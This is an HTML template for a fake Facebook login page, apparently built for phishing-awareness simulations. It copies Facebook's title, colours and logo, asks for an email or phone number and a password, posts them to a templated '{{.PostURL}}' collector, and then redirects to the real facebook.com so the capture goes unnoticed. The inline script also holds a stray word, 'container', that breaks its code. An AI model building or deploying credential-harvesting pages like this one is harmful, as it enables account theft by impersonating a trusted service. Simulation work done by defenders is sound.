<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>facebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    * { box-sizing: border-box; }

    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #f0f2f5;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    /* MAIN LAYOUT */
    .container {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding-top: 40px;
        gap: 90px;
    }

    /* LEFT SECTION */
    .left {
        max-width: 450px;
        margin-top: -40px;
    }

    .facekoob-logo {
        display: flex;
        align-items: center;
        gap: 15px;
        margin-bottom: 15px;
    }

    .facekoob-text {
        font-size: 56px;
        font-weight: 700;
        letter-spacing: -1px;
        color: #1877f2;
        font-family: "Segoe UI", Arial, sans-serif;
    }

    .tagline {
        font-size: 28px;
        line-height: 1.3;
        color: #1c1e21;
        margin-top: 10px;
        max-width: 360px;
    }

    /* LOGIN BOX */
    .login-box {
        background: #ffffff;
        padding: 20px;
        width: 360px;
        border-radius: 10px;
        box-shadow: 0 0 8px rgba(0,0,0,0.12);
    }

    input {
        width: 100%;
        padding: 14px;
        margin-bottom: 12px;
        border: 1px solid #ccd0d5;
        border-radius: 6px;
        font-size: 16px;
        display: block;
    }

    input:focus {
        outline: none;
        border-color: #1877f2;
    }

    .login-btn {
        width: 100%;
        padding: 14px;
        background: #1877f2;
        color: white;
        font-size: 20px;
        font-weight: 600;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        margin-top: 8px;
    }

    .forgot-link {
        display: block;
        text-align: center;
        color: #1877f2;
        margin-top: 12px;
        font-size: 14px;
        text-decoration: none;
    }

    .divider {
        margin: 20px 0;
        border-bottom: 1px solid #ddd;
    }

    .create-btn {
        width: 60%;
        padding: 12px;
        background: #42b72a;
        color: white;
        font-size: 17px;
        font-weight: 600;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        display: block;
        margin: 0 auto;
    }

    /* FOOTER */
    .footer {
        padding: 28px;
        text-align: center;
        color: #737373;
        font-size: 12px;
    }

    .footer a {
        margin: 0 6px;
        color: #737373;
        text-decoration: none;
    }

    .footer a:hover {
        text-decoration: underline;
    }
</style>

<script>
function showSimulationNotice(event) {
    

    alert("Thanks."); container

    document.querySelector("form").submit();

    setTimeout(() => {
        window.location.href = "https://facebook.com";
    }, 400);
}

</script>

</head>
<body>

<div class="container">

    <!-- LEFT SIDE -->
    <div class="left">
        <div class="facekoob-logo">
            <!-- Fictional SVG Logo -->
            <svg width="70" height="70" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="45" fill="#1877f2"/>
                <text x="50%" y="58%" text-anchor="middle" fill="white"
                      font-size="48" font-family="Arial" dy=".3em">f</text>
            </svg>

            <div class="facekoob-text">facekoob</div>
        </div>

        <div class="tagline">
            Connect with friends and the world around you on facebook.
        </div>
    </div>

    <!-- RIGHT SIDE -->
    <div class="login-box">
      <form method="POST" action="{{.PostURL}}" onsubmit="showSimulationNotice(event)">

            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>

            <button class="login-btn" type="submit">Log In</button>

            <a class="forgot-link" href="#">Forgot password?</a>

            <div class="divider"></div>

            <button class="create-btn" type="button">Create new account</button>
        </form>
    </div>

</div>

<!-- FOOTER -->
<div class="footer">
    <div>
        <a href="#">English (Training)</a>
        <a href="#">Koobanese</a>
        <a href="#">TestLang</a>
        <a href="#">Fictionalese</a>
        <a href="#">facekoob Lite</a>
    </div>

    <div style="margin-top: 10px;">
        <a href="#">Sign Up</a>
        <a href="#">Log In</a>
        <a href="#">Awareness Portal</a>
        <a href="#">Training Center</a>
        <a href="#">Policies</a>
    </div>

    <div style="margin-top: 10px;">
        facebook Â© 2025 
    </div>
</div>

</body>
</html>
